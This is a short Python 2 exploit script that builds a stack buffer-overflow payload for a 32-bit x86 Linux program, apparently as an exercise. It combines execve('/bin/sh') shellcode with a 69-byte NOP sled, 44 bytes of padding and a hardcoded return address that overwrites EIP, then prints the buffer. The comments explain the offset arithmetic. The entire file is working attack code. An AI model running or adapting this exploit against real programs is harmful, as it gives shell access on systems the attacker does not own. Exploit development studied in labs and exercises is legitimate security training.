#!/usr/bin/python

# exec /bin/sh
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# Before starting to overwrite the first byte of $eip, there are 138 bytes

def prep_buffer(addr_buffer):
    buf = "\x90" * 69 # 138/2 = 69; this way, first half of buffer will be NOP
    buf += shellcode # len(shellcode) = 25 
    # 69 + 25 = 94; and before overwriting $eip there are 138 bytes
    # 138 - 94 = 44
    buf += 'A' * 44 # 44 bytes more to fill up the buffer 
    buf += addr_buffer # address that will be put on $eip
    return buf

if __name__ == '__main__':
    addr_buffer = '\xac\xf8\xff\xbf' # $esp - 100
    buf = prep_buffer(addr_buffer)
    print buf
